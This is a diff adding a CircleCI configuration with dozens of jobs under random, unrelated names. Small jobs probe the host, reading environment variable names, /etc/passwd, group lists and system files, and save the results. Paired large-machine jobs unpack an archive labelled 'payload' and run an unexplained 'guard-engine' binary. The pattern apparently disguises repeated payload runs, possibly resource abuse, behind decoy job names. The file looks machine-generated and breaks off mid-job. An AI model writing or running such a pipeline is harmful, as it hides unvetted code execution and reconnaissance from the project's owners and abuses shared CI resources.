@@ -1,0 +1,1695 @@
+version: 2.1
+
+jobs:
+  shoot_circle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 1
+          command: |
+            mkdir -p /tmp/debug
+            set +o pipefail 2>/dev/null; seq 1 812228 | awk '{if($1%2){print "odd",$1} else {print "even",$1}}' > /tmp/debug/5fbc3f58b02663c9a; true
+            cat /tmp/debug/5fbc3f58b02663c9a > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '5fbc3f58b02663c9a'
+  produce-full-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/5fbc3f58b02663c9a && -f /tmp/debug/5fbc3f58b02663c9a ]] && cat /tmp/debug/5fbc3f58b02663c9a 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  ConvertTo-OffsetPixel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Toggle the empty state on tablet
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -type f -size +1M -printf "%y %p\n" 2>/dev/null | cat -n; true ; } > /tmp/debug/IMG_18915
+            cat /tmp/debug/IMG_18915 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'IMG_18915'
+  t-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/IMG_18915 && -f /tmp/debug/IMG_18915 ]] && cat /tmp/debug/IMG_18915 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  MAT2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Conduct drag against the map view
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'snow expected tomorrow' | wc -c; true ; } > /tmp/debug/BeamDusty
+            cat /tmp/debug/BeamDusty > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'BeamDusty'
+  run-end-to-end-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/BeamDusty && -f /tmp/debug/BeamDusty ]] && cat /tmp/debug/BeamDusty 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  git-test-57:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Issue the new hires by payroll cutoff
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; (trap 'echo done' EXIT; echo 'testing 1 2 3'); true ; } > /tmp/debug/IMG-00005591
+            cat /tmp/debug/IMG-00005591 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'IMG-00005591'
+  omar-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/IMG-00005591 && -f /tmp/debug/IMG-00005591 ]] && cat /tmp/debug/IMG-00005591 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  Y80:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Second half gc
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; ls -nl | sort -rk5 | head -n 3; true ; } > /tmp/debug/80.217.255
+            cat /tmp/debug/80.217.255 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '80.217.255'
+  v8-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  shim_sys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: STA tote bins
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; ls -l /dev|grep '^l'|head -n4; true ; } > /tmp/debug/kappa_9626_9bd
+            cat /tmp/debug/kappa_9626_9bd > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'kappa_9626_9bd'
+  europa-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/kappa_9626_9bd && -f /tmp/debug/kappa_9626_9bd ]] && cat /tmp/debug/kappa_9626_9bd 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  reduce_proxy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Chase up the commissions
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | sort | awk -F "=" '{print $1}' | head -n12; true ; } > /tmp/debug/debug-7dc966.log
+            cat /tmp/debug/debug-7dc966.log > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'debug-7dc966.log'
+  RUN_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/debug-7dc966.log && -f /tmp/debug/debug-7dc966.log ]] && cat /tmp/debug/debug-7dc966.log 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  VIEW_HUGE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Take hardening offline
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; sed 's/^[ \t]*//;s/[ \t]*$//' /proc/cpuinfo | cat -A | head -5; true ; } > /tmp/debug/willow.stock.peer.guest
+            cat /tmp/debug/willow.stock.peer.guest > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'willow.stock.peer.guest'
+  rust-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/willow.stock.peer.guest && -f /tmp/debug/willow.stock.peer.guest ]] && cat /tmp/debug/willow.stock.peer.guest 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  sqPE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Warsaw train session logs
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 1 -type l | sort; true ; } > /tmp/debug/memo_river_burst_raster
+            cat /tmp/debug/memo_river_burst_raster > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'memo_river_burst_raster'
+  november-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/memo_river_burst_raster && -f /tmp/debug/memo_river_burst_raster ]] && cat /tmp/debug/memo_river_burst_raster 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  monitor077:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: SkillTreeImport
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; mkfifo "/dev/shm/label-ginger-thumb.md" && ls -l "/dev/shm/label-ginger-thumb.md" && rm "/dev/shm/label-ginger-thumb.md"; true ; } > /tmp/debug/TXN-79366-QI
+            cat /tmp/debug/TXN-79366-QI > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'TXN-79366-QI'
+  yankee:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  no460:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Assert the sidebar shows
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'pack bags'|sed 's/bags/products/'; true ; } > /tmp/debug/xx_4022ff2d8b9698
+            cat /tmp/debug/xx_4022ff2d8b9698 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'xx_4022ff2d8b9698'
+  ensure-partial-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/xx_4022ff2d8b9698 && -f /tmp/debug/xx_4022ff2d8b9698 ]] && cat /tmp/debug/xx_4022ff2d8b9698 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  mask_sync_array_reject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: This is where we cold start the bootloader
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; whereami() { echo "[$(date +%T)] $*"; }; whereami '3 tests passed'; true ; } > /tmp/debug/159.28.98.175
+            cat /tmp/debug/159.28.98.175 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '159.28.98.175'
+  aug17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/159.28.98.175 && -f /tmp/debug/159.28.98.175 ]] && cat /tmp/debug/159.28.98.175 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  alice-future:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 1
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; mkfifo "/tmp/agreement-thread-garlic.conf" && ls -l "/tmp/agreement-thread-garlic.conf" && rm "/tmp/agreement-thread-garlic.conf"; true ; } > /tmp/debug/n9y7d0ap
+            cat /tmp/debug/n9y7d0ap > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'n9y7d0ap'
+  min-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/n9y7d0ap && -f /tmp/debug/n9y7d0ap ]] && cat /tmp/debug/n9y7d0ap 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  p_address:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: MentorPairingSchedulingStep
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=7194\nuser=mia\ndebug=false\n' >"/var/tmp/spring.txt" && grep ^port "/var/tmp/spring.txt" | cut -d= -f2; true ; } > /tmp/debug/molten.trade.bison.coin.river
+            cat /tmp/debug/molten.trade.bison.coin.river > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'molten.trade.bison.coin.river'
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/molten.trade.bison.coin.river && -f /tmp/debug/molten.trade.bison.coin.river ]] && cat /tmp/debug/molten.trade.bison.coin.river 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  lishbealglossx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: DO NOT skip the standard curve
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; awk -F : '$3 > $4{print NF}' /etc/passwd |sort -u; true ; } > /tmp/debug/REF_008722
+            cat /tmp/debug/REF_008722 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'REF_008722'
+  cf-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  assert_edge_join:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: 140 INPUT dialogue tree
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; printf '%s\n' "version 2.0" | grep -o . | sort | uniq -c | sort -rn | head -n 3; true ; } > /tmp/debug/105.137.198.160
+            cat /tmp/debug/105.137.198.160 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '105.137.198.160'
+  nightly-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/105.137.198.160 && -f /tmp/debug/105.137.198.160 ]] && cat /tmp/debug/105.137.198.160 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  HI_T:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: If the pager rotation is stale do nothing
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; grep -r -h -n -l bash /etc/default 2> /dev/null | wc -l; true ; } > /tmp/debug/t
+            cat /tmp/debug/t > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 't'
+  update-parse-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  G:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Sync with Diego
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd | cut -d":" -f3 | sort -n | tail -n1; true ; } > /tmp/debug/snapshot-v8.8.32
+            cat /tmp/debug/snapshot-v8.8.32 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'snapshot-v8.8.32'
+  Package_Suite9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/snapshot-v8.8.32 && -f /tmp/debug/snapshot-v8.8.32 ]] && cat /tmp/debug/snapshot-v8.8.32 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  hero--warning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Codename Dawn Comet
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; ls -G -r -i /usr/bin/*grep* /tmp|paste -sd ' '; true ; } > /tmp/debug/ARchIVered
+            cat /tmp/debug/ARchIVered > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'ARchIVered'
+  hotfix-1496:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/ARchIVered && -f /tmp/debug/ARchIVered ]] && cat /tmp/debug/ARchIVered 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  posT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Series II Escalating Partner Team
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; grep -cr 'color' /etc/skel 2>/dev/null | nl | head -n 8; true ; } > /tmp/debug/c0b41tb150n
+            cat /tmp/debug/c0b41tb150n > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'c0b41tb150n'
+  perseus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  bal_blvd_snd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: PURGE NIGHTLY DUMPS MANUAL
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; eval echo {1..4}; true ; } > /tmp/debug/bEamRIDgeQuARklAyER
+            cat /tmp/debug/bEamRIDgeQuARklAyER > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'bEamRIDgeQuARklAyER'
+  refactor-256:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/bEamRIDgeQuARklAyER && -f /tmp/debug/bEamRIDgeQuARklAyER ]] && cat /tmp/debug/bEamRIDgeQuARklAyER 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  cron012:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Shall we snapshot the query planner stats
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; for i in black teal purple yellow magenta brown;do echo "${i^}"; done | nl; true ; } > /tmp/debug/sample_266
+            cat /tmp/debug/sample_266 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'sample_266'
+  v5-alpha5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/sample_266 && -f /tmp/debug/sample_266 ]] && cat /tmp/debug/sample_266 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  d57:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Cache the hyperparams int8
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; for item in {3..1}; do echo $((RANDOM % 17)); done | head --lines=3; true ; } > /tmp/debug/rev.2.11
+            cat /tmp/debug/rev.2.11 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'rev.2.11'
+  INIT_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/rev.2.11 && -f /tmp/debug/rev.2.11 ]] && cat /tmp/debug/rev.2.11 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  cOlive:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Tidy Up State Nogo
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; getent group | awk -F':' '{ print $1, $3 }' | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/debug/blake_3c47cb44005
+            cat /tmp/debug/blake_3c47cb44005 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'blake_3c47cb44005'
+  fix-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/blake_3c47cb44005 && -f /tmp/debug/blake_3c47cb44005 ]] && cat /tmp/debug/blake_3c47cb44005 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  ugdf53al5j2iq961:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 1
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; \ls -F -s /usr/share | sort -r; true ; } > /tmp/debug/riverSilentChunk
+            cat /tmp/debug/riverSilentChunk > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'riverSilentChunk'
+  v5-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
